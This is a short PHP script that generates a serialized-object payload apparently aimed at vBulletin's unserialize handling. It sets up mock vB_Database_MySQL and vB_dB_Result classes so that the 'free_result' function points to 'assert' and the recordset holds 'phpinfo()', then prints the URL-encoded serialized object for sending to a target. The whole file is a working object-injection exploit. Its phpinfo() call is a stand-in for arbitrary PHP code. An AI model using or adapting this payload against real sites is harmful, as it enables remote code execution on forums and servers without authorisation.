<?php
 class vB_Database_MySQL{
        public $functions = array();
 
        public function __construct() 
        {
                $this->functions['free_result'] = 'assert';
        }
 }
 
 class vB_dB_Result {
        protected $db;
        protected $recordset;
 
        public function __construct()
        {
                $this->db = new vB_Database_MySQL();
                $this->recordset = "phpinfo()";
        }
 }
  
 //print (serialize(new vB_dB_Result())) . "\n";
 print urlencode(serialize(new vB_dB_Result())) . "\n";
